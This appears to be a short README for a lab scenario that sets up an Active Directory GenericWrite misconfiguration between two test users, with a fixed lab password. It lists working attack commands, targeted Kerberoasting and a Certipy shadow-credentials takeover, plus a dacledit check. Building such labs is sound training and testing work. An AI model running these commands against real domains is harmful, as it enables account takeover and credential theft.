# acl-genericwrite-user

User with GenericWrite on another user. Creates `scn-acl-gwu-attacker` (password `Aa1234567890!`) and the user `scn-acl-gwu-victim`, and gives the attacker `GenericWrite` (inheritance `None`) on it.

Attack:

    targetedKerberoast.py -d <domain> -u scn-acl-gwu-attacker -p 'Aa1234567890!' --request-user scn-acl-gwu-victim
    certipy shadow auto -u scn-acl-gwu-attacker@<domain> -p 'Aa1234567890!' -account scn-acl-gwu-victim

How to verify:

    dacledit.py -action read -principal scn-acl-gwu-attacker -target scn-acl-gwu-victim <domain>/scn-acl-gwu-attacker:'Aa1234567890!' -dc-ip <dc ip>   # shows WriteProperty, Self, ReadControl

Disable deletes both objects (the ACE goes with the target).
